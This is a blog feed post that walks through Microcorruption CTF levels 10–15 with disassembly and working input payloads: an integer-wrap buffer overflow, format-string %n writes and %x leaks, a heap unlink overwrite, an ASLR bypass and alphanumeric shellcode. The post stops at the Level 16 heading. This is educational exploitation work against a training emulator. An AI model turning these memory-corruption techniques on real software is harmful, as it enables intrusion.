<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[idosch]]></title>
  <link href="http://idosch.github.io/atom.xml" rel="self"/>
  <link href="http://idosch.github.io/"/>
  <updated>2014-05-07T23:21:17+03:00</updated>
  <id>http://idosch.github.io/</id>
  <author>
    <name><![CDATA[Ido Schimmel]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Microcorruption CTF - Part II]]></title>
    <link href="http://idosch.github.io/blog/2014/04/21/microcorruption-ctf-part-ii/"/>
    <updated>2014-04-21T22:51:26+03:00</updated>
    <id>http://idosch.github.io/blog/2014/04/21/microcorruption-ctf-part-ii</id>
    <content type="html"><![CDATA[<h2>Introduction</h2>

<p>This is the second post about the <a href="https://microcorruption.com">microcorruption CTF</a>. For the previous post click <a href="http://idosch.org/blog/2014/04/18/microcorruption-ctf-part-i/">here</a>.</p>

<h2>Level 10: Jakarta</h2>

<p>&ldquo;Zero bottles of beer on the wall, zero bottles of beer; take one down, pass it around, 65535 bottles of beer on the wall.&rdquo;</p>

<p>This quote says it all, but I&rsquo;ll explain anyway. Here the HSM 1 is back so we already know what we need to do: make the notorious <code>login</code> return to <code>unlock_door</code>. However, as always, there is a catch. Both a user name and a password should be entered and their combined length needs to be no more than 31 bytes, which is of course less than the number of bytes needed to overwrite the return address. Below are snippets from <code>login</code> with my remarks.</p>

<p>At this stage you already entered your user name and its length is stored in <code>r11</code>. The following code subtracts your user name&rsquo;s length from <code>0x1f</code> (31), stores the result in <code>r14</code> and use it to read that much bytes from the user as its password using <code>getsn</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>45c8:  3e40 1f00      mov   #0x1f, r14
</span><span class='line'>45cc:  0e8b           sub   r11, r14
</span><span class='line'>45ce:  3ef0 ff01      and   #0x1ff, r14
</span><span class='line'>45d2:  3f40 0224      mov   #0x2402, r15
</span><span class='line'>45d6:  b012 b846      call  #0x46b8 &lt;getsn&gt;</span></code></pre></td></tr></table></div></figure>


<p>After entering a password its length will be stored in <code>r15</code> with the user name length still in <code>r11</code>. Therefore, what the following code does is making sure the combined length is no more than 33 bytes, thereby, supposedly preventing us from overwriting the return address. Looking closer you may notice that the above statement is not accurate, as this is a <code>cmp.b</code> instruction that only checks the lower byte of the word and not all of it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>45fe:  0f5b           add   r11, r15
</span><span class='line'>4600:  7f90 2100      cmp.b #0x21, r15
</span><span class='line'>4604:  0628           jnc   #0x4612 &lt;login+0xb2&gt;</span></code></pre></td></tr></table></div></figure>


<p>Knowing all this and keeping in mind the quote from the beginning, the rest should be pretty clear. We begin by entering a user name<code>0x20</code> bytes long, as this will cause <code>r14</code> to become <code>0xffff</code> (-1) in <code>0x45cc</code>, thereby allowing us to enter a password of up to <code>0x1ff</code> bytes.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print '41'*32" | xclip -i</span></code></pre></td></tr></table></div></figure>


<p>Assuming the above user name was entered, the stack should look like this before a password is entered:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>3fe0:   0000 0000 7846 0300 ec46 0000 0a00 2000   ....xF...F.... .
</span><span class='line'>3ff0:   c845 4141 4141 4141 4141 4141 4141 4141   .EAAAAAAAAAAAAAA
</span><span class='line'>4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
</span><span class='line'>4010:   4141 0000 0000 4044 0000 0000 0000 0000   AA....@D........</span></code></pre></td></tr></table></div></figure>


<p>with the return address (<code>0x4440</code>) at <code>0x4016</code>. Keeping in mind that we already entered <code>0x20</code> bytes and that the lower byte of the combined length needs to be less than <code>0x22</code>, we need a password of length <code>0xe0</code> as the combined length will be <code>0xe0+0x20=0x100</code>. Thus, the following password is used:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print '41'*4 + '4c44' + '41'*218" | xclip -i</span></code></pre></td></tr></table></div></figure>


<p>Where the first four bytes simply fill the space between the end of the user name and the start of the return address and the next two bytes are the address of <code>unlock_door</code> (<code>0x444c</code>).</p>

<h2>Level 11: Addis Ababa</h2>

<p>The first thing to notice is the use of the <code>printf</code> subroutine as opposed to previous levels. Therefore, it is pretty obvious it needs to be examined.</p>

<p>The LockIT Pro manual lists the following <code>printf</code> conversion specifiers: <code>s</code>, <code>x</code>, <code>c</code> and <code>n</code>. The most interesting is the last, as it &ldquo;saves the number of characters printed thus far&rdquo;. Thus, it is possible to use this option in order to write data into memory and potentially change the order of execution.</p>

<p>If only one <code>n</code> specifier is used, then the character count up to <code>%</code> is copied to memory location <code>0x0</code>. However, if another specifier is used, then the function assumes the address to write to is given by the first two bytes of the format string. Hence, it is possible to write small values (byte count) to arbitrary memory locations, such as the memory location where the return address of the <code>printf</code> subroutine is stored (<code>0x402e</code>). This bug is usually the result of human error where the programmer mistakenly wrote <code>printf(str_buf)</code> instead of <code>printf("%s", str_buf)</code>. Of course using the <code>n</code> specifier is not the only way to exploit this, but there is a whole class of such exploits, called <a href="http://en.wikipedia.org/wiki/Uncontrolled_format_string">format string vulnerability</a>.</p>

<p>Since we can only write small values it is not possible to change the return address to anything useful (the <code>unlock_door</code> routine is at <code>0x44da</code>). However, in this level the HSM 1 is used, which writes a non-zero value to a specific memory location (<code>0x4032</code> in this case) if the user&rsquo;s password is correct. Owing to the fact that the <code>printf</code> subroutine is called after the password is checked, we can write a non-zero value (our byte count) to <code>0x4032</code>, thereby unlocking the door. This is accomplished by using the following input: <code>0x3240256e256e</code>.</p>

<p>Conclusion: never write <code>printf(buffer)</code>.</p>

<h2>Level 12: Novosibirsk</h2>

<p>This is very similar to the previous level (Addis Ababa). The only difference is that the HSM 2 is used instead of the HSM 1. Therefore, we use the same format string exploit, but instead of changing the memory location where the HSM 1 writes to, we simply change the value passed to the HSM 2 from <code>0x7e</code> (unlock if password is correct) to <code>0x7f</code> (unlock).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print 'c844' + '41'*127 + '256e'" | xclip -i</span></code></pre></td></tr></table></div></figure>


<h2>Level 13: Algiers</h2>

<p>This is probably my favorite level. In this level we enter a username and a password which are stored in the heap and not copied to the stack as in previous levels. The memory layout of the LockIT Pro is very much like that of the x86, with the heap growing towards higher memory addresses and the stack growing towards lower memory addresses.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Memory layout:
</span><span class='line'>----------
</span><span class='line'>|  heap  |    grows down
</span><span class='line'>|        |  
</span><span class='line'>----------
</span><span class='line'>| stack  |    grows up
</span><span class='line'>|        |
</span><span class='line'>----------</span></code></pre></td></tr></table></div></figure>


<p>Although the HSM 1 is employed in this level with the <code>unlock_door</code> subroutine present, it is not possible to simply overwrite the return address and jump there, as no user entered data is copied to the stack. Starting with the <code>login</code> subroutine we see the following:</p>

<p>Two <code>0x10</code> bytes chunks are allocated on the heap and their respective addresses stored in registers <code>r10</code> and <code>r11</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>463e:  3f40 1000      mov   #0x10, r15
</span><span class='line'>4642:  b012 6444      call  #0x4464 &lt;malloc&gt;
</span><span class='line'>4646:  0a4f           mov   r15, r10
</span><span class='line'>4648:  3f40 1000      mov   #0x10, r15
</span><span class='line'>464c:  b012 6444      call  #0x4464 &lt;malloc&gt;
</span><span class='line'>4650:  0b4f           mov   r15, r11</span></code></pre></td></tr></table></div></figure>


<p>Then, a username and a password with a length of up to <code>0x30</code> chars each are written into these chunks with the username in the first chunk. Notice that although the chunk size is only <code>0x10</code> bytes, <code>0x30</code>bytes are read from the user!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4666:  0f4a           mov   r10, r15
</span><span class='line'>4668:  b012 0a47      call  #0x470a &lt;getsn&gt;
</span><span class='line'>466c:  3f40 c845      mov   #0x45c8, r15
</span><span class='line'>4670:  b012 1a47      call  #0x471a &lt;puts&gt;
</span><span class='line'>4674:  3f40 d445      mov   #0x45d4, r15
</span><span class='line'>4678:  b012 1a47      call  #0x471a &lt;puts&gt;
</span><span class='line'>467c:  3e40 3000      mov   #0x30, r14
</span><span class='line'>4680:  0f4b           mov   r11, r15
</span><span class='line'>4682:  b012 0a47      call  #0x470a &lt;getsn&gt;</span></code></pre></td></tr></table></div></figure>


<p>Next, the password is passed to <code>test_password_valid</code>, which in turn sends it to the HSM 1, and if it is valid the door is unlocked. As you have probably noticed, the username is not used at all.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4686:  0f4b           mov   r11, r15
</span><span class='line'>4688:  b012 7045      call  #0x4570 &lt;test_password_valid&gt;
</span><span class='line'>468c:  0f93           tst   r15
</span><span class='line'>468e:  0524           jz    #0x469a &lt;login+0x60&gt;
</span><span class='line'>4690:  b012 6445      call  #0x4564 &lt;unlock_door&gt;</span></code></pre></td></tr></table></div></figure>


<p>Finally, both the username and the password are freed from the heap using <code>free</code>, with the password being freed first and then the username.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>46a2:  0f4b           mov   r11, r15
</span><span class='line'>46a4:  b012 0845      call  #0x4508 &lt;free&gt;
</span><span class='line'>46a8:  0f4a           mov   r10, r15
</span><span class='line'>46aa:  b012 0845      call  #0x4508 &lt;free&gt;</span></code></pre></td></tr></table></div></figure>


<p>One obvious flaw in this program is the one already pointed out: although the username and password are allocated each only <code>0x10</code> bytes, <code>0x30</code> bytes are read from the user. Thus, corrupting the heap seems like a good way for passing this level. A useful way to understand how the heap works is to look at it before and after each <code>malloc</code> call:</p>

<p>Just before allocating <code>0x10</code> bytes for the username:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>2400:   0824 0010 0100 0000 0000 0000 0000 0000   .$..............</span></code></pre></td></tr></table></div></figure>


<p>Just after allocating <code>0x10</code> bytes for the username:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
</span><span class='line'>2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
</span><span class='line'>2420:   0824 c81f 0000 0000 0000 0000 0000 0000   .$..............</span></code></pre></td></tr></table></div></figure>


<p>Just after allocating <code>0x10</code> bytes for the password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
</span><span class='line'>2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
</span><span class='line'>2420:   3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
</span><span class='line'>2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........</span></code></pre></td></tr></table></div></figure>


<p>Looking at these we can see that the heap is managed using a circular doubly-linked list. Each chunk&rsquo;s payload is preceded by a 6 byte allocation metadata containing the addresses of the previous and next chunks and also the size and status (free or not).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;----           6 bytes           ----&gt;
</span><span class='line'>+----------+----------+---------------+----------------------+
</span><span class='line'>| bk       | fd       | size/status   | payload              | ...
</span><span class='line'>+----------+----------+---------------+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>Quoting <a href="http://g.oswego.edu/dl/html/malloc.html">Doug Lea</a>, this allows for &ldquo;two bordering unused chunks to be coalesced into one large chunk&rdquo; and &ldquo;all chunks can be traversed starting from any known chunk in either a forward or backward direction&rdquo;.</p>

<p>The <code>malloc</code> subroutine is not very useful to us, as it only writes to the heap values which we don&rsquo;t have control over. However, this knowledge greatly helps in reversing the <code>free</code> subroutine, as it puts everything in context. Below is the <code>free</code> subroutine with my comments:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>r15 stores the address of the payload to free.
</span><span class='line'>4508 &lt;free&gt;
</span><span class='line'>4508:  0b12           push  r11
</span><span class='line'>450a:  3f50 faff      add   #0xfffa, r15    // subtract 0x6 to get the address of the allocation metadata.
</span><span class='line'>450e:  1d4f 0400      mov   0x4(r15), r13   // r13 stores size and allocation status.
</span><span class='line'>4512:  3df0 feff      and   #0xfffe, r13    // set chunk as free
</span><span class='line'>4516:  8f4d 0400      mov   r13, 0x4(r15)   // and write back to memory.
</span><span class='line'>451a:  2e4f           mov   @r15, r14       // r14 stores metadata address of previous chunk.
</span><span class='line'>451c:  1c4e 0400      mov   0x4(r14), r12   // r12 stores size and allocation status of previous chunk.
</span><span class='line'>4520:  1cb3           bit   #0x1, r12       // check if previous chunk is free.
</span><span class='line'>4522:  0d20           jnz   #0x453e &lt;free+0x36&gt; // jump if previous chunk is not free.</span></code></pre></td></tr></table></div></figure>


<p>Since the previous chunk is free, we can merge both chunks into one big free chunk. The size of the new chunk is the size of the previous chunk (stored in <code>r12</code>), plus the 6 bytes of the metadata of current chunk plus its size.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4524:  3c50 0600      add   #0x6, r12
</span><span class='line'>4528:  0c5d           add   r13, r12
</span><span class='line'>452a:  8e4c 0400      mov   r12, 0x4(r14)
</span><span class='line'>452e:  9e4f 0200 0200 mov   0x2(r15), 0x2(r14)  // since the previous chunk is free, set its next pointer to the next pointer of current chunk.
</span><span class='line'>4534:  1d4f 0200      mov   0x2(r15), r13       // r13 stores address of the next chunk.
</span><span class='line'>4538:  8d4e 0000      mov   r14, 0x0(r13)       // set the prev pointer of the next chunk to the previous free chunk, creating one big chunk. 
</span><span class='line'>453c:  2f4f           mov   @r15, r15</span></code></pre></td></tr></table></div></figure>


<p>Graphically, this looks as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;----  not in use  ----&gt;         &lt;- chunk to free -&gt;
</span><span class='line'>+------+------+--------+---------+-----+----+------+---------+------+
</span><span class='line'>| p_bk | p_fd | p_meta | payload | bk  | fd | meta | payload | n_bk | ...
</span><span class='line'>+------+------+--------+---------+-----+----+------+---------+------+
</span><span class='line'>
</span><span class='line'>&lt;----          not in use             ----&gt;
</span><span class='line'>+------+-----------+----------------------+------------------+---------------------------+
</span><span class='line'>| p_bk | p_fd = fd | p_meta += meta + 0x6 |      payload     |   n_bk = address of p_bk  |
</span><span class='line'>+------+-----------+----------------------+------------------+---------------------------+</span></code></pre></td></tr></table></div></figure>


<p>If the next chunk is free (as opposed to the previous one), then a very similar process takes place (not described here). Writing the above code snippet in C it will look something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>prev = p-&gt;bk;
</span><span class='line'>prev-&gt;meta += p-&gt;meta + 6;
</span><span class='line'>prev-&gt;fd = p-&gt;fd;
</span><span class='line'>next = p-&gt;fd;
</span><span class='line'>next-&gt;bk = prev;</span></code></pre></td></tr></table></div></figure>


<p>where <code>p</code> is the argument passed to <code>free</code>. Now, since our goal is the overwrite the location of the return address (<code>0x439a</code>) of the <code>login</code> subroutine with the address of the <code>unlock_door</code> subroutine (<code>0x4564</code>) we can use the following values:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>p-&gt;bk = 0x4396;
</span><span class='line'>p-&gt;fd = 0x4400;
</span><span class='line'>p-&gt;status = 0x011e;</span></code></pre></td></tr></table></div></figure>


<p>Keeping in mind that we can overwrite the metadata of a chunk by overflowing the payload of the one preceding it, it&rsquo;s easy to overwrite the metadata of the chunk storing the password by inserting a username with a length of 22 chars, such as this one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print '41'*16 + '9643' + '0044' + '1e01'" | xclip -i</span></code></pre></td></tr></table></div></figure>


<h2>Level 14: Vladivostok</h2>

<p>Up until now, whenever we wanted to change the order of execution we knew in advance the address we wanted to get to (usually that of the <code>unlock_door</code> subroutine). However, in this level <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> is introduced. As the name suggests, ASLR randomly arranges the address space before each execution, thereby hindering our ability to jump to a particular memory location. To understand this better lets breakdown the <code>main</code> subroutine.</p>

<p>First, the <code>rand</code> subroutine is called twice to generate two random values stored in <code>r11</code> and <code>r10</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>4438 &lt;main&gt;
</span><span class='line'>4438:  b012 1c4a      call  #0x4a1c &lt;rand&gt;
</span><span class='line'>443c:  0b4f           mov   r15, r11
</span><span class='line'>443e:  3bf0 fe7f      and   #0x7ffe, r11
</span><span class='line'>4442:  3b50 0060      add   #0x6000, r11
</span><span class='line'>4446:  b012 1c4a      call  #0x4a1c &lt;rand&gt;
</span><span class='line'>444a:  0a4f           mov   r15, r10</span></code></pre></td></tr></table></div></figure>


<p>Next, using <code>memcpy</code> the program code it copied over to the random location pointed to by <code>r11</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>444c:  3012 0010      push  #0x1000
</span><span class='line'>4450:  3012 0044      push  #0x4400 &lt;__init_stack&gt;
</span><span class='line'>4454:  0b12           push  r11
</span><span class='line'>4456:  b012 e849      call  #0x49e8 &lt;_memcpy&gt;</span></code></pre></td></tr></table></div></figure>


<p>Leaving the stack in its original location isn&rsquo;t very smart, so it&rsquo;s setup in a new memory location using the second random value stored in &lsquo;r10&rsquo;:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>445a:  3150 0600      add   #0x6, sp
</span><span class='line'>445e:  0f4a           mov   r10, r15
</span><span class='line'>4460:  3ff0 fe0f      and   #0xffe, r15
</span><span class='line'>4464:  0e4b           mov   r11, r14
</span><span class='line'>4466:  0e8f           sub   r15, r14
</span><span class='line'>4468:  3e50 00ff      add   #0xff00, r14
</span><span class='line'>...
</span><span class='line'>4472:  014e           mov   r14, sp</span></code></pre></td></tr></table></div></figure>


<p>Finally, the program calls the <code>aslr_main</code> subroutine located in its new random memory location.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>446c:  0d4b           mov   r11, r13
</span><span class='line'>446e:  3d50 5c03      add   #0x35c, r13
</span><span class='line'>...
</span><span class='line'>4474:  0f4b           mov   r11, r15
</span><span class='line'>4476:  8d12           call  r13</span></code></pre></td></tr></table></div></figure>


<p>Since the whole program is copied over to a new memory location, I wrote a little script that given the original code and the ASLR offset (stored in <code>r11</code>) outputs the code with the new addresses:</p>

<div><script src='https://gist.github.com/8c3d94e69cd5cf683f5c.js?file=vladivostok.py'></script>
<noscript><pre><code>import argparse


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(&quot;asm&quot;, help=&quot;assembly code file&quot;, type=str)
    parser.add_argument(&quot;output_asm&quot;, help=&quot;assembly output file&quot;, type=str)
    parser.add_argument(&quot;offset&quot;, help=&quot;aslr offset (e.g. 0xffff)&quot;, type=str)
    args = parser.parse_args()

    f = open(args.asm, &#39;r&#39;)
    code = f.readlines()
    f.close()
    f = open(args.output_asm, &#39;w&#39;)
    base_address = int(&#39;0x4400&#39;, 16)
    for line in code[2:]:
        address = int(line[:4], 16)
        new_address = hex(address - base_address + int(args.offset, 16))
        f.write(new_address + line[4:])
    f.close()

if __name__ == &#39;__main__&#39;:
    main()</code></pre></noscript></div>


<p>Now, what the <code>aslr_main</code> subroutine does is merely call the <code>_aslr_main</code> subroutine, which is quite long. By means of dynamic analysis we see that this subroutine prompts for a username, prints it and then prompts for a password, which is passed to the HSM 2. Entering a long username does not reveal anything except for the fact that no more than 8 chars are printed. However, once we enter more than 8 chars as a password we get the following message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>insn address unaligned</span></code></pre></td></tr></table></div></figure>


<p>Therefore, we conclude that the password is stored on the stack and that we can overwrite the return address! Further investigation reveals that username is printed using <code>printf</code> (as opposed to <code>puts</code>) and that <code>0x14</code> bytes are read from the user as a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>45da:  3241           pop   sr
</span><span class='line'>45dc:  3152           add   #0x8, sp
</span><span class='line'>45de:  c24e 2e24      mov.b r14, &0x242e    // makes sure no more than 8 bytes are printed.
</span><span class='line'>45e2:  0b12           push  r11
</span><span class='line'>45e4:  8c12           call  r12     // r12 stores the address of printf.
</span><span class='line'>...
</span><span class='line'>4684:  3241           pop   sr
</span><span class='line'>4686:  3152           add   #0x8, sp
</span><span class='line'>4688:  0b41           mov   sp, r11
</span><span class='line'>468a:  2b52           add   #0x4, r11
</span><span class='line'>468c:  3c40 1400      mov   #0x14, r12  // read up to 0x14 bytes.
</span><span class='line'>4690:  2d43           mov   #0x2, r13   // according to the LockIT manual 0x2 is the interrupt for gets.
</span><span class='line'>4692:  0c12           push  r12
</span><span class='line'>4694:  0b12           push  r11
</span><span class='line'>4696:  0d12           push  r13
</span><span class='line'>4698:  0012           push  pc
</span><span class='line'>469a:  0212           push  sr
</span><span class='line'>469c:  0f4d           mov   r13, r15
</span><span class='line'>469e:  8f10           swpb  r15
</span><span class='line'>46a0:  024f           mov   r15, sr
</span><span class='line'>46a2:  32d0 0080      bis   #0x8000, sr
</span><span class='line'>46a6:  b012 1000      call  #0x10</span></code></pre></td></tr></table></div></figure>


<p>Since the HSM 2 is used we don&rsquo;t have any <code>unlock_door</code> subroutine to return to (even if there was, we don&rsquo;t know its address due to ASLR) and we also can&rsquo;t use the previously discussed format string vulnerabilities, as we don&rsquo;t know where the argument we want to change is stored. Thus, our only option it to write a <a href="http://en.wikipedia.org/wiki/Shellcode">shellcode</a> to the stack, that will pass the <code>INT</code> subroutine <code>0x7f</code> (trigger unlock) as an argument. However, pointing the PC to its location a problem, as we don&rsquo;t know where the stack is located.</p>

<p>Although it&rsquo;s not possible to use the <code>%n</code> specifier to do anything useful, we can still exploit the <code>printf</code> subroutine by passing it the <code>%x</code> specifier that will print the values found on the stack. Entering <code>%x%x</code> we get the following output (it depends on the first value produced by <code>rand</code>):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0000bcdc</span></code></pre></td></tr></table></div></figure>


<p>Which is the address of <code>printf</code>! Knowing the the new address of <code>printf</code> and the program&rsquo;s structure we can easily overwrite the return address with that of our shellcode (also on the stack), which will trigger an unlock.</p>

<h2>Level 15: Lagos</h2>

<p>Lagos is an ordinary level except for the fact the only alphanumeric characters can be used for the password. This greatly decreases the number of instructions we can use in our shellcode. Thankfully, Ryan Hitchman has already compiled a <a href="https://gist.github.com/rmmh/8515577">list</a> of instructions that can be represented using only alphanumeric characters.</p>

<p>Looking at <code>login</code> we see that <code>0x200</code> bytes are read from the user as a password, then copied over to the stack starting at address <code>0x43ed</code> and finally the original password location (<code>0x2400</code>) is cleared using <code>memset</code>. As before, the objective is to trigger and unlock by issuing the <code>0x7f</code> interrupt.</p>

<p>Since the return address is stored on the stack at <code>0x43fe</code> it&rsquo;s possible to overwrite it using the password. Now, I&rsquo;m pretty sure some people managed to use an address that will allow them to write a shorter shellcode by exploiting a bug in the emulator, but I&rsquo;ll use a straightforward one: <code>0x4430</code> which will take us to the beginning of the shellcode:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>3453        add #-0x1, r4
</span><span class='line'>4e44        mov.b r4, r14
</span><span class='line'>7850 7272   add.b #0x7272, r8
</span><span class='line'>3850 7a43   add #0x437a, r8
</span><span class='line'>3048        mov @r8+, pc</span></code></pre></td></tr></table></div></figure>


<p>The last instruction jumps to the second instruction of <code>INT</code> with an interrupt <code>0xff</code> (it&rsquo;s equivalent to <code>0x7f</code> &ndash; look at the code) stored in <code>r14</code>, thereby allowing us to unlock the door. As you&rsquo;ve probably noticed all the instructions are represented using only alphanumeric characters (<code>0x30-0x39, 0x41-0x5a, 0x61-0x7a</code>).</p>

<h2>Level 16: Bangalore</h2>

